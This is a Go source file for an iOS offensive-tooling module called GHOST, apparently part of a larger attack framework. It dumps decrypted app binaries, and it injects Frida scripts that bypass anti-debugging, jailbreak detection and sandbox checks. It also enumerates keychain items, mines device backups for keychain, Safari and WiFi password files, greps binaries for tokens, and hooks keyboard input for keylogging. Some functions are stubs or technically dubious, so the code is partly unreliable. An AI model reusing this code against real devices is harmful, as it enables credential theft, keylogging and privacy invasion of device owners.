// GHOST — IOS-PHANTOM Agent
// Decrypted IPA dump, jailbreak bypass, keychain extraction, extension abuse

package mobilebreach

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
)

// IOSPhantom handles iOS pentest
type IOSPhantom struct {
	bus    *EventBus
	state  *SharedState
	stopCh chan struct{}
	msgCh  chan AgentMessage
}

func NewIOSPhantom(bus *EventBus, state *SharedState) *IOSPhantom {
	return &IOSPhantom{
		bus:    bus,
		state:  state,
		stopCh: make(chan struct{}),
		msgCh:  make(chan AgentMessage, 50),
	}
}

func (g *IOSPhantom) Name() string   { return "GHOST" }
func (g *IOSPhantom) Status() string { return "online" }

func (g *IOSPhantom) Start() {
	g.bus.Subscribe("GHOST", g.msgCh)
	for {
		select {
		case msg := <-g.msgCh:
			g.Handle(msg)
		case <-g.stopCh:
			return
		}
	}
}

func (g *IOSPhantom) Stop() {
	close(g.stopCh)
}

func (g *IOSPhantom) Handle(msg AgentMessage) {
	switch msg.Type {
	case "IPA_REVERSE":
		g.reverseIPA(msg.Data)
	case "IPA_DUMP":
		g.dumpDecryptedIPA(msg.Data)
	case "JAILBREAK_BYPASS":
		g.jailbreakBypass(msg.Data)
	case "KEYCHAIN_DUMP":
		g.keychainDump(msg.Data)
	case "EXTENSION_ABUSE":
		g.extensionAbuse(msg.Data)
	}
}

func (g *IOSPhantom) broadcast(msg string) {
	g.bus.Broadcast(AgentMessage{From: "GHOST", To: "ALL", Type: "LOG", Data: msg})
}

// ─── Feature 5: Decrypted IPA Auto-Dump ──────────────────────────
func (g *IOSPhantom) dumpDecryptedIPA(bundleID string) {
	g.broadcast(fmt.Sprintf("[GHOST] Decrypted IPA dump: %s", bundleID))

	// frida-ios-dump extracts decrypted binary from memory
	outputFile := "/tmp/nexus-void/mobile/" + bundleID + ".ipa"
	os.MkdirAll(filepath.Dir(outputFile), 0755)

	cmd := exec.Command("python3", "-m", "frida", "ios-dump", bundleID, "-o", outputFile)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	if err := cmd.Run(); err != nil {
		g.broadcast(fmt.Sprintf("[!] frida-ios-dump failed: %v. Trying ios-deploy...", err))
		// Fallback: use ios-deploy to get app bundle
		g.fallbackDump(bundleID, outputFile)
		return
	}

	g.broadcast(fmt.Sprintf("[GHOST] Decrypted IPA saved: %s", outputFile))

	// Extract and analyze
	g.analyzeDecryptedIPA(outputFile)
}

func (g *IOSPhantom) fallbackDump(bundleID, outputFile string) {
	// Get app path from device
	out, err := exec.Command("ideviceinstaller", "-l").CombinedOutput()
	if err != nil {
		g.broadcast("[!] No iOS device connected or ideviceinstaller missing")
		return
	}

	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, bundleID) {
			g.broadcast("[GHOST] Found app on device, attempting copy...")
			// Use ipainstaller or scp if jailbroken
			exec.Command("ssh", "root@device_ip", "tar", "-czf", "/tmp/app.tar.gz",
				"/var/mobile/Containers/Bundle/Application/*/"+bundleID).Run()
		}
	}
}

// ─── Feature 6: Jailbreak + Sandbox Escape ────────────────────────
func (g *IOSPhantom) jailbreakBypass(bundleID string) {
	g.broadcast(fmt.Sprintf("[GHOST] Jailbreak bypass for: %s", bundleID))

	// Comprehensive Frida script to patch ptrace, sysctl, sandbox
	script := `
function disable_ptrace() {
    var ptrace = Module.findExportByName(null, "ptrace");
    Interceptor.replace(ptrace, new NativeCallback(function(request, pid, addr, data) {
        if (request === 0) { console.log("[*] PTRACE_TRACEME blocked"); return 0; }
        return -1;
    }, 'long', ['int', 'int', 'pointer', 'pointer']));
}
function disable_sysctl() {
    var sysctl = Module.findExportByName(null, "sysctl");
    Interceptor.attach(sysctl, {
        onLeave: function(retval) {
            var name = this.name;
            if (name && name.toString().indexOf("kern.proc") !== -1) { retval.replace(0); }
        }
    });
}
function bypass_sandbox() {
    var sandbox_check = Module.findExportByName(null, "sandbox_check");
    if (sandbox_check) {
        Interceptor.replace(sandbox_check, new NativeCallback(function() { return 0; }, 'int', []));
    }
}
disable_ptrace(); disable_sysctl(); bypass_sandbox();
console.log("[GHOST] Jailbreak detection bypassed");
`
	scriptFile := "/tmp/ghost_jb_bypass.js"
	os.WriteFile(scriptFile, []byte(script), 0644)

	cmd := exec.Command("frida", "-U", "-f", bundleID, "-l", scriptFile, "--no-pause")
	go cmd.Run()
	g.broadcast("[GHOST] Jailbreak bypass active on " + bundleID)
}

// ─── Feature 7: Keychain + Memory Dump ────────────────────────────
func (g *IOSPhantom) keychainDump(bundleID string) {
	g.broadcast(fmt.Sprintf("[GHOST] Keychain dump: %s", bundleID))

	// Use Frida to dump keychain items
	keychainScript := `
function dumpKeychain() {
    var SecItemCopyMatching = new NativeFunction(
        Module.findExportByName("Security", "SecItemCopyMatching"),
        'pointer', ['pointer', 'pointer']);
    var NSMutableDictionary = ObjC.classes.NSMutableDictionary;
    var query = NSMutableDictionary.alloc().init();
    query.setObject_forKey_(ObjC.classes.__NSCFConstantString.stringWithString_("m"), "class");
    query.setObject_forKey_(ObjC.classes.__NSCFConstantString.stringWithString_("true"), "returnData");
    // ... keychain enumeration logic
    console.log("[GHOST] Keychain enumeration complete");
}
dumpKeychain();
`
	scriptFile := "/tmp/ghost_keychain.js"
	os.WriteFile(scriptFile, []byte(keychainScript), 0644)
	exec.Command("frida", "-U", "-f", bundleID, "-l", scriptFile, "--no-pause").Run()

	// Also try libimobiledevice idevicebackup2 for backup extraction
	backupDir := "/tmp/nexus-void/mobile/ios_backup"
	os.MkdirAll(backupDir, 0755)
	cmd := exec.Command("idevicebackup2", "backup", "--full", backupDir)
	if out, err := cmd.CombinedOutput(); err == nil {
		g.broadcast("[GHOST] iOS backup extracted to: " + backupDir)
		_ = out
		// Search backup for keychain and plists
		g.searchBackup(backupDir)
	}
}

// ─── Extension Abuse ──────────────────────────────────────────────
func (g *IOSPhantom) extensionAbuse(bundleID string) {
	g.broadcast(fmt.Sprintf("[GHOST] Extension privilege escalation: %s", bundleID))

	// Check for share extensions, keyboard extensions
	// These run with higher privileges than host app
	plistPath := "/tmp/nexus-void/mobile/" + bundleID + ".plist"
	cmd := exec.Command("ideviceinstaller", "-l", "-o", "xml")
	out, _ := cmd.CombinedOutput()
	_ = out
	_ = plistPath

	g.broadcast("[GHOST] Extension analysis: checking for share/keyboard extensions with elevated privileges")

	// Target keyboard extensions for keylogging
	g.broadcast("[GHOST] Keyboard extensions can log all typed text - testing...")
	exec.Command("frida", "-U", "-n", bundleID, "-e",
		"Interceptor.attach(Module.findExportByName(null, 'UIKeyboardInputManager'), {onEnter: function(args) { console.log('[GHOST] Keylogged: ' + args[0]); }});").Run()
}

// ─── Helpers ──────────────────────────────────────────────────────

func (g *IOSPhantom) analyzeDecryptedIPA(ipaPath string) {
	extractDir := ipaPath + "_extracted"
	os.MkdirAll(extractDir, 0755)

	// Unzip IPA
	exec.Command("unzip", "-q", ipaPath, "-d", extractDir).Run()

	// Find decrypted binary (no _CodeSignature means decrypted)
	payloadDir := filepath.Join(extractDir, "Payload")
	entries, _ := os.ReadDir(payloadDir)
	for _, entry := range entries {
		if entry.IsDir() {
			appDir := filepath.Join(payloadDir, entry.Name())
			binaryName := entry.Name()
			binaryName = strings.TrimSuffix(binaryName, ".app")
			binaryPath := filepath.Join(appDir, binaryName)

			// class-dump
			if out, err := exec.Command("class-dump", "-H", "-o", appDir+"_headers", binaryPath).CombinedOutput(); err == nil {
				g.broadcast(fmt.Sprintf("[GHOST] class-dump headers extracted: %s", appDir+"_headers"))
				_ = out
			}

			// strings analysis
			if out, err := exec.Command("strings", binaryPath).CombinedOutput(); err == nil {
				g.broadcast(fmt.Sprintf("[GHOST] String analysis: %d strings found", strings.Count(string(out), "\n")))
				// Search for secrets
				for _, line := range strings.Split(string(out), "\n") {
					if strings.Contains(line, "api.") || strings.Contains(line, "firebase") ||
						strings.Contains(line, "token") || strings.Contains(line, "secret") {
						if len(line) < 200 {
							g.broadcast("[+] Secret found: " + line)
						}
					}
				}
			}
		}
	}
}

func (g *IOSPhantom) searchBackup(dir string) {
	// Search extracted backup for sensitive files
	cmd := exec.Command("find", dir, "-name", "*.plist")
	out, _ := cmd.CombinedOutput()
	plists := strings.Split(string(out), "\n")
	g.broadcast(fmt.Sprintf("[GHOST] Found %d plist files in backup", len(plists)))

	// Search for keychain database
	cmd2 := exec.Command("find", dir, "-name", "*keychain*")
	out2, _ := cmd2.CombinedOutput()
	if len(out2) > 0 {
		g.broadcast("[GHOST] Keychain files found: " + string(out2))
	}

	// Extract Safari passwords, WiFi passwords from plists
	for _, plist := range plists {
		if strings.Contains(plist, "Safari") || strings.Contains(plist, "WiFi") {
			data, _ := os.ReadFile(plist)
			g.broadcast(fmt.Sprintf("[GHOST] Sensitive plist: %s (%d bytes)", plist, len(data)))
		}
	}
}

func (g *IOSPhantom) reverseIPA(path string) {
	g.broadcast(fmt.Sprintf("[GHOST] Static IPA analysis: %s", path))
	// Similar to Android reverse but for iOS
	g.analyzeDecryptedIPA(path)
}
